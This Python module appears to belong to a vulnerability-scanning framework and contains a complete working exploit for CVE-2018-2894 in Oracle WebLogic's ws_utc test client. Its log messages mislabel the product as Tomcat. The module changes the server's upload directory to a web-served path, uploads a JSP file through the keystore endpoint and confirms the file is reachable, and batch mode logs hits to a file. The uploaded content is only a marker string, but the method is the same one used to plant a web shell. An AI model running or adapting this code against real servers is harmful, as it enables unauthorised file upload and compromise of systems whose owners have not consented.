#!/user/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
import requests
import urllib3
import xml.etree.ElementTree as ET
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class Cve_2018_2894:
    def get_current_work_path(self, host):
        geturl = host + "/ws_utc/resources/setting/options/general"
        ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}
        values = []
        try:
            request = requests.get(geturl)
            if request.status_code == 404:
                if not self.batch:
                    OutPrintInfo("Tomcat",f"{host}  don't exists CVE-2018-2894")
                return
            elif "Deploying Application".lower() in request.text.lower():
                if not self.batch:
                    OutPrintInfo("Tomcat","First Deploying Website Please wait a moment ...")
                time.sleep(20)
                request = requests.get(geturl, headers=ua, proxies=self.proxy, timeout=self.timeout, verify=self.ssl)
            if "</defaultValue>" in request.text:
                root = ET.fromstring(request.content)
                value = root.find("section").find("options")
                for e in value:
                    for sub in e:
                        if e.tag == "parameter" and sub.tag == "defaultValue":
                            values.append(sub.text)
        except requests.ConnectionError:
            return
        if values:
            return values[0]
        else:
            if not self.batch:
                OutPrintInfo("Tomcat","Cannot get current work path")
            # exit(request.content)
            return

    def get_new_work_path(self, host):
        origin_work_path = self.get_current_work_path(host)
        works = "/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
        if "user_projects" in origin_work_path:
            if "\\" in origin_work_path:
                works = works.replace("/", "\\")
                current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects\\domains"
                dir_len = len(current_work_home.split("\\"))
                domain_name = origin_work_path.split("\\")[dir_len]
                current_work_home += "\\" + domain_name + works
            else:
                current_work_home = origin_work_path[:origin_work_path.find("user_projects")] + "user_projects/domains"
                dir_len = len(current_work_home.split("/"))
                domain_name = origin_work_path.split("/")[dir_len]
                current_work_home += "/" + domain_name + works
        else:
            current_work_home = origin_work_path
            if not self.batch:
                OutPrintInfo("Tomcat",f"cannot handle current work home dir: {origin_work_path}")
        return current_work_home

    def set_new_upload_path(self, host, path):
        data = {
            "setting_id": "general",
            "BasicConfigOptions.workDir": path,
            "BasicConfigOptions.proxyHost": "",
            "BasicConfigOptions.proxyPort": "80"}
        request = requests.post(host + "/ws_utc/resources/setting/options", data=data, headers=self.headers,
                                proxies=self.proxy, timeout=self.timeout, verify=self.ssl)
        if "successfully" in request.text:
            return True
        else:
            if not self.batch:
                OutPrintInfo("Tomcat","Change New Upload Path failed")
            # exit(request.content)
            return

    def upload_webshell(self, host, uri):
        self.set_new_upload_path(host, self.get_new_work_path(host))
        files = {
            "ks_edit_mode": "false",
            "ks_password_front": self.password,
            "ks_password_changed": "true",
            "ks_filename": ("360sglab.jsp", self.upload_content)
        }

        request = requests.post(host + uri, files=files, headers=self.hd, proxies=self.proxy, timeout=self.timeout,
                                verify=self.ssl)
        response = request.text
        match = re.findall("<id>(.*?)</id>", response)
        if match:
            tid = match[-1]
            shell_path = host + "/ws_utc/css/config/keystore/" + str(tid) + "_360sglab.jsp"
            if self.upload_content in requests.get(shell_path, headers=self.headers, proxies=self.proxy,
                                                   timeout=self.timeout, verify=self.ssl).text:
                if not self.batch:
                    OutPrintInfo("Tomcat",f"{host} exists CVE-2018-2894")
                    OutPrintInfoSuc("Tomcat",f"Check URL: {shell_path} ")
                else:
                    OutPrintInfoSuc("Tomcat", f"Check URL: {shell_path} ")
                    OutPutFile("apache_2018_2894.txt",f"Check URL: {shell_path} ")
            else:
                if not self.batch:
                    OutPrintInfo("Tomcat",f"{host}don't exists CVE-2018-2894")
        else:
            if not self.batch:
                OutPrintInfo("Tomcat",f"{host}don't exists CVE-2018-2894")

    def main(self, target):
        self.batch = target["batch_work"]
        self.password = "360sglab"
        url_dir = "/ws_utc/resources/setting/keystore"
        self.upload_content = "360sglab test"
        url = target["url"].strip('/ ')
        heaedr = target["header"]

        proxy = target["proxy"]
        self.ssl = target["ssl"]
        self.timeout = int(target["timeout"])
        
        self.hd = {"User-Agent": heaedr}
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)


        
        self.headers = {
            'User-Agent': heaedr,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest', }

        try:
            self.upload_webshell(url, url_dir)
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Tomcat","目标不存在漏洞")
